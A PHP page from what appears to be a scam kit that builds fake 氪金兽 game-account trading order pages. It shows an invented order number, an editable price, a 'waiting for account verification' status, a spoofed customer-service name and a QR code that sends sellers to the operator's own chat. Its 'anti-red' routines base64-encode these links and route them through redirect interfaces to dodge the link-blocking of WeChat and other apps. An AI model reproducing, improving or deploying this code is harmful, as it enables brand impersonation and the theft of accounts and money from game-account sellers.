<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

function createChatSession($sessionId, $customerName, $agentAccount, $platform = '氪金兽') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-q' . $currentAgent . 's';
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '氪金兽');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$customerServiceName = "喜乐";
$originalServiceUrl = $baseUrl . '/' . "ChatKjs" . '?id=' . $sessionId;

if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

$originalServiceUrl .= '&kjskefu=' . urlencode($customerServiceName);

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>

	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/kejinshou.css">
     <style>
        .kjs-preview {
    max-height: calc(100% + 1px);
    min-height: calc(100% + 1px);
    max-width: 100%;
    min-width: 100%;
    position: relative;
    overflow: hidden;
}
    </style>
</head>
<body> 
 <div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                           <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
					<div class="form-row">
						<label>标题</label>
						<input type="text" id="title-input" placeholder="请输入商品标题">
					</div>
					<div class="form-row">
						<label>价格</label>
						<input type="text" id="price-input" placeholder="请输入价格">
					</div>
					<div class="form-row">
						<label>客服名称</label>
						<input type="text" id="customer-service-input" placeholder="请输入客服名称" value="喜乐">
					</div>
					<div class="form-row">
						<label>订单状态</label>
						<select id="order-status-select">
							<option value="进行中">进行中</option>
							<option value="担保中">担保中</option>
							<option value="待验号">待验号</option>
						</select>
					</div>
					<div class="form-row">
						<label>扫码</label>
						<select id="pay-select">
							<option value="微信">微信(推荐)</option>
							<option value="支付宝">支付宝</option>
							<option value="QQ">QQ</option>
							<option value="百度">百度</option>
							<option value="浏览器">浏览器</option>
						</select>
					</div>
					<div class="form-row">
						<label>封面图</label>
						<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
						<input type="file" accept="image/*" id="upload-cover" style="display: none;">
					</div>
				</div>
				
				<div class="kjs-preview order-status-container">
					<div class="status-card">
						<div class="status-header" id="preview-status-header">已付款，等待卖家配合客服验号</div>
						<div class="status-progress-container">
							<div class="status-progress-wrapper">
								<div class="status-progress-track"></div>
								<div class="status-progress-fill"></div>
								<div class="status-steps">
									<div class="status-step">
										<div class="status-step-circle active"></div>
										<div class="status-step-text-px">已付款</div>
									</div>
									<div class="status-step">
										<div class="status-step-circle"></div>
										<div class="status-step-text">联系客服</div>
									</div>
									<div class="status-step">
										<div class="status-step-circle"></div>
										<div class="status-step-text">客服核号</div>
									</div>
									<div class="status-step">
										<div class="status-step-circle"></div>
										<div class="status-step-text">换绑账号</div>
									</div>
									<div class="status-step">
										<div class="status-step-circle"></div>
										<div class="status-step-text">完成交易</div>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="status-card">
						<div class="contact-section">
							<div class="contact-info">
								<h2 class="contact-title">联系客服</h2>
								<p class="contact-detail">客服：氪金兽客服-<span class="contact-name" id="preview-customer-service"></span></p>
								<p class="contact-detail">请提醒卖家<span class="contact-method" id="preview-zhifu">微信</span>扫码处理</p>
								<p class="contact-tip">为保障您的交易安全，请勿将此二维码泄露给他人</p>
							</div>
							<div class="qr-code-container">
								<div class="qr-code-wrapper" id="qrcode"></div>
								<div class="qr-logo">
									<img src="/assets/img/kjs.png" alt="氪金兽客服">
								</div>
							</div>
						</div>
					</div>
					
					<div class="status-card">
						<div class="product-info">
							<div style="display: flex; align-items: center; gap: 12px;">
								<div class="product-image-container">
									<img src="/assets/img/chunse.png" alt="商品图片" id="preview-image">
								</div>
								<div class="product-details">
									<div class="product-title" id="preview-title">商品标题</div>
								</div>
							</div>
						</div>
						<div class="price-details">
							<div class="price-row">
								<span>商品总价</span>
								<span class="price-value" id="preview-price">¥0.00</span>
							</div>
							 <div class="price-row">
								<span>实付款</span>
								<span class="price-value" id="preview-price2">¥0.00</span>
							</div>
							<div class="price-row">
								<span>订单状态</span>
								<span class="price-value" id="preview-order-status">待验号</span>
							</div>
							<div class="price-row">
								<span>订单编号</span>
								<span class="price-value"><?php echo date('YmdHis') . rand(1000, 9999); ?></span>
							</div>
						</div>
					</div>
					
					<div class="status-card bottom-banner">
						<img src="https://file.kejinshou.com/static/images/h5/app-intro/intro-home.png?x-oss-process=style/app" alt="氪金兽" class="banner-img">
					</div>
				</div>
			</div>
		</div>
	</div>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
var updateQRCodeTimeout = null;
var currentQRCode = null;

function updateQRCodeWithServiceName(serviceName) {
    var baseLink = "<?php 
        $baseLink = $baseUrl . '/' . "ChatKjs" . '?id=' . $sessionId;
        if ($xedataToken) {
            $baseLink .= '&XEDATA=' . $xedataToken;
        }
        echo $baseLink;
    ?>";
    
    var newLink = baseLink + '&kjskefu=' + encodeURIComponent(serviceName);
    
    var finalLink = newLink;
    <?php if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])): ?>
        var antiRedApiUrl = "<?php echo $antiRedConfig['api_url']; ?>";
        var encodedLink = btoa(newLink);
        finalLink = antiRedApiUrl + encodedLink;
    <?php elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])): ?>
        var siteUrl = "<?php echo $siteUrlConfig['site_url']; ?>";
        var encodedLink = btoa(unescape(encodeURIComponent(newLink)));
        finalLink = siteUrl + encodedLink;
    <?php endif; ?>
    
    var qrcodeContainer = document.getElementById("qrcode");
    qrcodeContainer.innerHTML = "";
    
    if (currentQRCode) {
        try {
            currentQRCode.clear();
        } catch(e) {
            qrcodeContainer.innerHTML = "";
        }
    }
    
    try {
        currentQRCode = new QRCode(qrcodeContainer, {
            text: finalLink,
            width: getQRSize(finalLink, 130),
            height: getQRSize(finalLink, 130),
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: getQRCorrectLevel(finalLink)
        });
    } catch(e) {
        console.error('QR码生成失败，尝试降级:', e);
        try {
            qrcodeContainer.innerHTML = '';
            currentQRCode = new QRCode(qrcodeContainer, {
                text: finalLink,
                width: 140,
                height: 140,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.L
            });
        } catch(e2) {
            qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:130px;height:130px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
        }
    }
}

document.addEventListener('DOMContentLoaded', function() {
    var titleInput = document.getElementById('title-input');
    var priceInput = document.getElementById('price-input');
    var customerServiceInput = document.getElementById('customer-service-input');
    var orderStatusSelect = document.getElementById('order-status-select');
    var paySelect = document.getElementById('pay-select');
    var uploadCover = document.getElementById('upload-cover');
    var uploadLabel = document.getElementById('upload-label');
    
    var previewPrice = document.getElementById('preview-price');
    var previewPrice2 = document.getElementById('preview-price2');
    var previewPayType = document.getElementById('preview-zhifu');
    var previewImage = document.getElementById('preview-image');
    var previewTitle = document.getElementById('preview-title');
    var previewCustomerService = document.getElementById('preview-customer-service');
    var previewOrderStatus = document.getElementById('preview-order-status');
    
    var initialServiceName = customerServiceInput.value || '喜乐';
    updateQRCodeWithServiceName(initialServiceName);
    
    customerServiceInput.addEventListener('input', function() {
        var serviceName = this.value || '喜乐';
        previewCustomerService.textContent = serviceName;
        
        clearTimeout(updateQRCodeTimeout);
        updateQRCodeTimeout = setTimeout(function() {
            updateQRCodeWithServiceName(serviceName);
        }, 500);
    });
    
    priceInput.addEventListener('input', function() {
        var price = this.value;
        if (price && !isNaN(price)) {
            var formattedPrice = formatPrice(price);
            previewPrice.textContent = '¥' + formattedPrice;
            previewPrice2.textContent = '¥' + formattedPrice;
        } else {
            previewPrice.textContent = '¥0.00';
            previewPrice2.textContent = '¥0.00';
        }
    });
    
    function formatPrice(price) {
        var num = price.replace(/[^\d.]/g, '');
        if (!num) return '0.00';
        
        var parsed = parseFloat(num);
        if (isNaN(parsed)) return '0.00';
        
        return parsed.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }
    
    paySelect.addEventListener('change', function() {
        previewPayType.textContent = this.value;
    });
    
    titleInput.addEventListener('input', function() {
        previewTitle.textContent = this.value || '商品标题';
    });
    
    orderStatusSelect.addEventListener('change', function() {
        previewOrderStatus.textContent = this.value;
    });
    
    uploadCover.addEventListener('change', function(e) {
        var file = e.target.files[0];
        if (file) {
            var reader = new FileReader();
            reader.onload = function(e) {
                previewImage.src = e.target.result;
                uploadLabel.textContent = '已上传';
                previewImage.style.display = 'block';
            };
            reader.readAsDataURL(file);
        }
    });
    
    if (priceInput.value) {
        var formattedPrice = formatPrice(priceInput.value);
        previewPrice.textContent = '¥' + formattedPrice;
        previewPrice2.textContent = '¥' + formattedPrice;
    }
    
    previewTitle.textContent = titleInput.value || '商品标题';
    previewPayType.textContent = paySelect.value;
    
    if (!previewImage.src) {
        previewImage.style.display = 'none';
    }
    
    var copyLinkBtn = document.getElementById('copy-link-btn');
    if (copyLinkBtn) {
        copyLinkBtn.addEventListener('click', function() {
            var serviceName = document.getElementById('customer-service-input').value || '喜乐';
            
            var baseLink = "<?php 
                $baseLink = $baseUrl . '/' . "ChatKjs" . '?id=' . $sessionId;
                if ($xedataToken) {
                    $baseLink .= '&XEDATA=' . $xedataToken;
                }
                echo $baseLink;
            ?>";
            
            var linkToCopy = baseLink + '&kjskefu=' + encodeURIComponent(serviceName);
            
            <?php if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])): ?>
                var antiRedApiUrl = "<?php echo $antiRedConfig['api_url']; ?>";
                var encodedLink = btoa(linkToCopy);
                linkToCopy = antiRedApiUrl + encodedLink;
            <?php elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])): ?>
                var siteUrl = "<?php echo $siteUrlConfig['site_url']; ?>";
                var encodedLink = btoa(unescape(encodeURIComponent(linkToCopy)));
                linkToCopy = siteUrl + encodedLink;
            <?php endif; ?>
            
            copyToClipboard(linkToCopy);
        });
    }
    
    function copyToClipboard(text) {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(function() {
                showToast('链接已复制到剪贴板！');
            }).catch(function(err) {
                console.error('Clipboard API failed: ', err);
                fallbackCopy(text);
            });
        } else {
            fallbackCopy(text);
        }
    }
    
    function fallbackCopy(text) {
        var textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.left = '-9999px';
        document.body.appendChild(textarea);
        textarea.select();
        
        try {
            var successful = document.execCommand('copy');
            if (successful) {
                showToast('链接已复制到剪贴板！');
            } else {
                alert('复制失败，请手动复制链接');
            }
        } catch (err) {
            console.error('Fallback copy failed: ', err);
            alert('复制失败，请手动复制链接');
        }
        
        document.body.removeChild(textarea);
    }
    
    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }
});

function updateQRCodeWithServiceName(serviceName) {
    var baseLink = "<?php 
        $baseLink = $baseUrl . '/' . "ChatKjs" . '?id=' . $sessionId;
        if ($xedataToken) {
            $baseLink .= '&XEDATA=' . $xedataToken;
        }
        echo $baseLink;
    ?>";
    
    baseLink = baseLink.replace(/&kjskefu=[^&]*/, '');
    
    if (baseLink.indexOf('?') === -1) {
        baseLink += '?';
    } else if (!baseLink.endsWith('?') && !baseLink.endsWith('&')) {
        baseLink += '&';
    }
    
    var newLink = baseLink + 'kjskefu=' + encodeURIComponent(serviceName);
    
    var finalLink = newLink;
    <?php if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])): ?>
        var antiRedApiUrl = "<?php echo $antiRedConfig['api_url']; ?>";
        try {
            var encodedLink = btoa(unescape(encodeURIComponent(newLink)));
            finalLink = antiRedApiUrl + encodedLink;
        } catch(e) {
            console.error("Base64编码错误:", e);
            finalLink = newLink;
        }
    <?php elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])): ?>
        var siteUrl = "<?php echo $siteUrlConfig['site_url']; ?>";
        try {
            var encodedLink = btoa(unescape(encodeURIComponent(newLink)));
            finalLink = siteUrl + encodedLink;
        } catch(e) {
            console.error("Base64编码错误:", e);
            finalLink = newLink;
        }
    <?php endif; ?>
    
    var qrcodeContainer = document.getElementById("qrcode");
    qrcodeContainer.innerHTML = "";
    
    var qrDiv = document.createElement("div");
    qrDiv.id = "qrcode-" + Date.now();
    
    qrcodeContainer.appendChild(qrDiv);
    
    try {
        new QRCode(qrDiv, {
            text: finalLink,
            width: getQRSize(finalLink, 130),
            height: getQRSize(finalLink, 130),
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: getQRCorrectLevel(finalLink)
        });
        
        console.log("二维码生成成功，链接长度:", finalLink.length);
    } catch(e) {
        console.error('QR码生成失败，尝试降级:', e);
        try {
            qrDiv.innerHTML = '';
            new QRCode(qrDiv, {
                text: finalLink,
                width: 140,
                height: 140,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.L
            });
        } catch(e2) {
            qrDiv.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:130px;height:130px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
        }
    }
}
</script>
</body>
</html>